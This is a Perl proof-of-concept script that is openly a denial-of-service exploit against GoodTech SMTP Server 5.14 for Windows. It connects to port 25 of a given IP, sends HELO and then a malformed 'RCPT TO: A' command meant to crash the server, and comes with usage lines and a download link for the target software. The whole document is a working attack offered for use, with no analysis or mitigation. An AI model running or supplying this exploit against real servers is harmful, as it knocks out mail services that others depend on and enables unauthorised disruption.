#===== Start GoodTechSMTPServer_DOS.pl =====
#
# Usage: GoodTechSMTPServer_DOS.pl <ip>
#        GoodTechSMTPServer_DOS.pl 127.0.0.1
#
# GoodTech SMTP Server for Windows NT/2000/XP version 5.14
#
# Download:
# http://www.goodtechsys.com/
#
###########################################################

use IO::Socket;
use strict;

my($socket) = "";

if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                    PeerPort => "25",
                                    Proto    => "TCP"))
{
        print "Attempting to kill GoodTech SMTP Server at $ARGV[0]:25...";

        sleep(1);

        print $socket "HELO moto.com\r\n";

        sleep(1);

        print $socket "RCPT TO: A\r\n";

        close($socket);
}
else
{
        print "Cannot connect to $ARGV[0]:25\n";
}
#===== End GoodTechSMTPServer_DOS.pl =====

